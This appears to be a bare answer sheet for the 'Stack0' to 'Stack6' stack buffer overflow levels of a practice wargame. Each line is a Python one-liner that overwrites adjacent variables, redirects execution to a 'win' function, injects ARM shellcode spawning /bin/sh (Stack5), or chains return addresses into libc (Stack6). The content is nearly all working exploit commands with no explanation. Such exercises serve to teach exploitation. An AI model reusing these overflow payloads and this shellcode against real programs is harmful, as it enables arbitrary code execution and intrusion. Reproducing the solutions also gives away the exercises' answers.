# Stack0

python -c "print 'A' * 65" | ./stack0

# Stack1 

./stack1 `python -c "print 'A' * 64 + '\x64\x63\x62\x61'"`

# Stack2

export GREENIE="`python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'"`"

./stack2

# Stack3

0001047c <win>

python -c "print 'A' * 64 + '\x7c\x04\x01\x00'" | ./stack3

# Stack4

objdump -d stack4 | grep win

python -c "print 'A' * 64 + '\x4c\x04\x01\x00' * 4 " | ./stack4

# Stack5

cat <(python -c "print 'A' * 68 + '\x50\xf2\xff\xbe' + '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78'") - | ./stack5

# Stack6

cat <(python -c "print 'A' * 80 + '\x48\x5d\xea\xb6' + 'AAAA' + '\x20\x1b\xf9\xb6' + 'AAAA' + '\xac\xdf\xea\xb6'") - | ./stack6
